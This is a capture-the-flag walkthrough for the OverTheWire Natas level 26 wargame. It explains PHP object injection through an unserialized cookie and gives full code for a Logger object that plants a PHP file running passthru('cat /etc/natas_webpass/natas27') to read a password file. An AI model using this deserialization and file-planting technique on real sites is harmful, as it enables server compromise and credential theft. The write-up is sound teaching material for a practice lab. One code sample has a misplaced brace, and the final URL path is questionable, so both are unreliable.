# This is a write-up for Natas - level 26

This level is about exploiting the drawing interface on the main page.

Let's look at the source code:
```php
<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }

?>
```
In short, the php code for the page takes a line supplied by the user and overlays that on top of already existing lines.
This happens by taking in data from the get request and from the 'drawing' cookie.

Importantly, the drawing data is continually stored in the cookie using the storeData function.
```php
<?php function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }

        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }

        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>
```

The existing data is unserialized and decoded, the new drawing data is appended, and the cookie is encoded and serialized again.
I found '$drawing[]=$new_object;' confusing as a beginner in PHP, so I'll explain it: 
- [] means that $drawing is an array.
- = appends data to $drawing, since $drawing already exists.

Now that we understand the drawing cookie, we draw our attention to the Logger class.
Following the flow of the main section, it doesn't appear to do anything.

However, we can exploit the serialization of the cookie to inject a Logger object into the server. Let me outline the steps:

1. Make a Logger object that has a malicious payload in its exitMsg and has a logFile name that we can access
2. Serialize and encode the object
3. Insert the object as the drawing cookie in our browser's DevTools
4. Upon running storeData, the server decodes and unserializes the cookie
5. After unserializing the data, the Logger object is gotten rid of using __destruct(), which is a custom (magic) method of the script
6. During this __destruct call, the payload in exitMsg will be written to the logFile 
7. If the logFile is a .php file, we can execute any php code that was in the exitMsg
8. We can navigate to the logFile in the url bar to retrieve the output of our payload.

With the game plan, you can try solving the exercise on your own, or you can follow the walkthrough below:

Our Logger object needs a $logFile and $exitMsg, and these variables need to be private
```php
<?php
class Logger {
	private $logFile;
	private $exitMsg;
}
$logger = new Logger();
echo serialize($logger); // Just for your viewing, not actually needed
echo base64_encode(serialize($logger));
```

Now, the logger object is serialized and encoded, but it doesn't do anything. To actually make an attack, we need a payload.
```php
<?php
class Logger {
	private $logFile;
	private $exitMsg;

	function __construct(){
            $this->exitMsg= <payload>;
            $this->logFile= <log-file>;
	}
$logger = new Logger();
echo serialize($logger);
echo base64_encode(serialize($logger));
}
```

The __construct() method is an example of a 'magic method' as I described above. It is run automatically as I run 'new Logger();' and it sets the exit message and log file for the object.

Two hints for what the payload and log-file should be:

1. Payload should be some php code that can fetch the password from the file system.
2. Log-file should be in a location that we can acess it and with the .php file ending.

<details>
    <summary>
        Click here for the full code and path
    </summary>

```php
<?php
class Logger {
	private $logFile;
	private $exitMsg;
function __construct(){
	       $this->exitMsg= "<?php echo passthru('cat /etc/natas_webpass/natas27'); ?>";
	       $this->logFile= "/var/www/natas/natas26/img/natas26_myseshpwd.php";
	}

}

$logger = new Logger();
echo serialize($logger);
echo base64_encode(serialize($logger));
?>
```
Now navigate to natas26.natas.labs.overthewire.org/var/www/natas/natas26/img/natas26_myseshpwd.php" to find your password.
</details>
PS: You can run the php file in this folder to help you solve this :D
